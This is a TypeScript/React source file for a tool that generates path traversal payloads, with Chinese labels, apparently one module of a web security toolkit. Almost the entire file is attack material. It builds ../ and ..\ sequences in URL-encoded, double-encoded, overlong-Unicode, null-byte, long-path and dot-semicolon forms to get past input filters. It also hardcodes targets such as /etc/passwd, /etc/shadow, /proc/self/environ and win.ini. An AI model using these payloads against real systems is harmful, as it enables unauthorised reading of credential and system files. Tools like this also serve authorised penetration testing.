import SimpleTool from '../../_shared/SimpleTool';
import type { ToolProps } from '../../types';

/* ============================================================
 * Path Traversal Payload Generator
 * Generates directory traversal payloads for Linux/Windows.
 * ========================================================== */

const encodeHex = (s: string): string =>
  s.split('').map((ch) => `%${ch.charCodeAt(0).toString(16).padStart(2, '0').toUpperCase()}`).join('');

const doubleEncode = (s: string): string =>
  s.split('').map((ch) => `%25${ch.charCodeAt(0).toString(16).padStart(2, '0').toUpperCase()}`).join('');

const generateTraversal = (target: string, os: string, depthStr: string, bypass: string): string => {
  const depth = Math.max(1, parseInt(depthStr, 10) || 5);
  const targetPath = target.trim() || (os === 'Windows' ? 'windows/win.ini' : 'etc/passwd');
  const sep = os === 'Windows' ? '\\' : '/';
  const dotdot = os === 'Windows' ? '..\\' : '../';

  const lines: string[] = [];
  lines.push(`── 路径穿越 Payload (${os}) ──`);
  lines.push(` [目标文件] ${targetPath}`);
  lines.push(` [回溯深度] ${depth}`);
  lines.push(` [绕过方式] ${bypass}`);
  lines.push('');

  // Build the base traversal string
  const baseTraversal = dotdot.repeat(depth) + targetPath;
  const forwardBase = '../'.repeat(depth) + targetPath;
  const backBase = '..\\'.repeat(depth) + targetPath;

  lines.push(' ▸ 基础穿越:');
  lines.push(`   ${forwardBase}`);
  if (os === 'Windows') {
    lines.push(`   ${backBase}`);
  }
  lines.push('');

  // URL-encoded
  lines.push(' ▸ URL编码:');
  lines.push(`   ${encodeHex(forwardBase)}`);
  if (os === 'Windows') {
    lines.push(`   ${encodeHex(backBase)}`);
  }
  lines.push('');

  // Double-encoded
  lines.push(' ▸ 双重URL编码:');
  lines.push(`   ${doubleEncode(forwardBase)}`);
  lines.push('');

  if (bypass === 'double-encode') {
    lines.push(' ▸ 双重编码绕过 payload:');
    lines.push(`   ${doubleEncode(forwardBase)}`);
    lines.push(`   ${doubleEncode(backBase)}`);
    lines.push(`   %252e%252e%252f`.repeat(depth) + encodeHex(targetPath));
    lines.push('');
  }

  if (bypass === 'unicode') {
    lines.push(' ▸ Unicode 编码绕过:');
    lines.push(`   ${forwardBase.split('').map((ch) => {
      if (ch === '.') return '%c0%ae';
      if (ch === '/') return '%c0%af';
      if (ch === '\\') return '%c0%5c';
      return ch;
    }).join('')}`);
    lines.push(`   ..%c0%af..%c0%af${targetPath}`);
    lines.push(`   ..%ef%bc%8f..%ef%bc%8f${targetPath}`);
    lines.push('');
  }

  if (bypass === 'truncate') {
    lines.push(' ▸ 截断绕过 (null byte / 超长路径):');
    lines.push(`   ${forwardBase}%00.png`);
    lines.push(`   ${forwardBase}%00`);
    lines.push(`   ${'A'.repeat(260)}..${sep}..${sep}${targetPath}`);
    if (os === 'Windows') {
      lines.push(`   ${backBase}${' '.repeat(200)}`);
    }
    lines.push('');
  }

  if (bypass === 'dotsemicolon') {
    lines.push(' ▸ 点分号绕过 (.;/):');
    lines.push(`   ../.;/.;/.;/.;/${targetPath}`);
    lines.push(`   ..;/..;/..;/${targetPath}`);
    lines.push(`   .;./.;./.;./.;./${targetPath}`);
    lines.push('');
  }

  // Mixed separators
  lines.push(' ▸ 混合分隔符:');
  lines.push(`   ..%2f..%2f..%2f${targetPath}`);
  lines.push(`   ..%5c..%5c..%5c${targetPath}`);
  lines.push(`   ..%252f..%252f..%252f${targetPath}`);
  lines.push(`   ....//....//....//${targetPath}`);
  lines.push('');

  // Windows-specific
  if (os === 'Windows') {
    lines.push(' ▸ Windows 专用:');
    lines.push(`   ..\\..\\..\\..\\..\\windows\\win.ini`);
    lines.push(`   ..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts`);
    lines.push(`   ..%5c..%5c..%5c..%5cwindows%5cwin.ini`);
    lines.push(`   ..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini`);
    lines.push(`   /..\\\\..\\\\..\\\\windows\\\\win.ini`);
    lines.push('');
  }

  // Linux-specific
  if (os === 'Linux') {
    lines.push(' ▸ Linux 专用:');
    lines.push(`   ../../../../etc/passwd`);
    lines.push(`   ../../../../etc/shadow`);
    lines.push(`   ../../../../etc/hosts`);
    lines.push(`   ../../../../proc/self/environ`);
    lines.push(`   ../../../../var/log/apache2/access.log`);
    lines.push(`   ../../../../proc/self/cmdline`);
    lines.push('');
  }

  lines.push(' 说明:');
  lines.push('  - ../ (Linux) 和 ..\\ (Windows) 是基本穿越序列');
  lines.push('  - URL编码 %2e%2e%2f 绕过简单过滤 ../ ');
  lines.push('  - 双重编码 %252e%252e%252f 绕过一次解码后的过滤');
  lines.push('  - Unicode 编码 %c0%ae%c0%af 绕过某些解析器');
  lines.push('  - 截断 %00 (PHP<5.3) 或超长路径 (Windows 260字符限制)');
  lines.push('  - 点分号 .;/ 绕过部分路径规范化逻辑');
  return lines.join('\n');
};

const ToolComponent = (props: ToolProps) => (
  <SimpleTool
    {...props}
    toolName="路径穿越Payload"
    paramsConfig={[
      {
        name: 'os',
        label: '系统',
        type: 'select',
        default: 'Linux',
        options: [
          { value: 'Linux', label: 'Linux' },
          { value: 'Windows', label: 'Windows' },
        ],
      },
      {
        name: 'depth',
        label: '深度',
        type: 'text',
        default: '5',
        placeholder: '回溯层数',
      },
      {
        name: 'bypass',
        label: '绕过',
        type: 'select',
        default: 'none',
        options: [
          { value: 'none', label: '无' },
          { value: 'double-encode', label: '双重编码' },
          { value: 'unicode', label: 'Unicode编码' },
          { value: 'truncate', label: '截断' },
          { value: 'dotsemicolon', label: '点分号' },
        ],
      },
    ]}
    execute={(input: string, _mode: string, params: Record<string, unknown>): string => {
      const os = (params.os as string) ?? 'Linux';
      const depth = (params.depth as string) ?? '5';
      const bypass = (params.bypass as string) ?? 'none';
      return generateTraversal(input, os, depth, bypass);
    }}
  />
);
export default ToolComponent;
